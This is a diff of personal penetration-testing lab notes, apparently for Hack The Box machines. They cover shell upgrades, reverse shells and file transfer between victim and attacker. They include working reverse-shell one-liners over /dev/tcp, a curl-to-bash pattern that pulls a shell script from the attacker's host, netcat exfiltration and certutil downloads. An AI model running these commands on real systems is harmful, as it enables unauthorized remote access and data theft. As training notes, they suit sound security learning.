@@ -1,5 +1,84 @@
 ## Shell
+
+
+### bin/bash vs bin/shell
+- at bin/shell only $ is shown
+- at bin/bash the whole path is shown
+
+### Bad Shells
+- sudo -l for example dont delvier anything
+- some stuff is not working well
+- can happen when over exploits etc
+- no tty present
+
+#### Reasons for bad shells
+- wrong shell architecture x86 vs x64
+- wrong shell type (bash, sh, zsh, etc.)
+- shell over exploit, includes, etc.
+
+### Good Shells
+- sudo -l delivers something
+- maybe even tab completion
+- print 
+- meterpreter shells are also nice often
+
+### Upgrade a shell
+- metersploit can do it
+- [Upgrading Simple Shells to Fully Interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) sometimes didnt work
+```sh
+# when commands are restricted
+ssh guest@192.254.1.12 -t "bash --noprofile" # --noprofile can work
+
+#curl a shell
+echo "/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.190/1338 0>&1'" > shell.sh
+python3 -m http.server 8001
+nc -lvnp 1338
+curl 10.10.14.190:8001/shell.sh|bash
+
+# phyton or phyton3 import pty
+python -c 'import pty; pty.spawn("/bin/bash")'
+#or 
+echo os.system('/bin/bash') # or echo os.system('/bin/sh') 
+#or
+/bin/sh -i # or /bin/bash -i
+```
+
+### Reverse Shell
+Shell from the target to the attacker.
+- possible to connect throught firewall
+#### Some Reverse Shell generators / links
+- [Pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+- [High on Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
+- [Revshells](https://www.revshells.com/)
+
+### Transfer files
+- httb, ftp, ssh, smb, scp, curl, wget, netcat etc
+```sh
+#http python server
+python3 -m http.server 8000
+wget http://yourip:8000/file
+
+```
+simple http put server to put from victim to attacker
+- https://gist.github.com/fabiand/5628006
+```sh
+#windows to get a file from http server
+certutil -urlcache -split -f "http://" outputfile
+
+#curl or wget ftp or http
+wget ftp:// 
+
+#netcat
+nc -l -p 1234 > out.file #receiving box
+nc -w 3 [destination] 1234 < out.file #sending box destination is the ip of the receiving box
+
+#scp
+scp file user@ip:/path/to/file # sending
+```
+
+### Hosts File
 echo to host file
+
 ```sh
 echo "10.129.152.215 unika.htb" | sudo tee -a /etc/hosts
 ```
@@ -42,14 +121,19 @@ nc -nvlp 1337
 bash -i >& /dev/tcp/10.10.15.71/1337 0>&1
 
 python3 -m http.server 8000
-
 ```
-### get own ip
+### other commands need to know
+
+#### uname
+```sh
+uname -a #print system information
+```
+#### get own ip
 ```
 ip a | grep tun0 
 
 ```
-### pwd
+#### pwd
 ```sh
 pwd #print working directory
 ```
@@ -57,23 +141,21 @@ pwd #print working directory
 python -m http.server 8001
 ```
 
-### Differences between files
+#### Differences between files
 ```sh
 diff -y file1 file2
 -y # side by side
 ```
 
-## CurlAShell
-```bash
-#Create shell.sh file
-#!/bin/bash
-/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.190/6565 0>&1'
-#start python server
-python3 -m http.server 8003
-#start netcat listener
-nc -lvnp 6565
-#curl the shell
-curl 10.10.14.190:8003/shell.sh|bash
+#### SU & Sudo
+```sh
+su otheruser #switch user
+sudo -l #list sudo rights
+sudo su #switch to root
 ```
 
-
+#### Locate
+Suchen von Dateien
+```sh
+locate PowerUp.ps1
+```
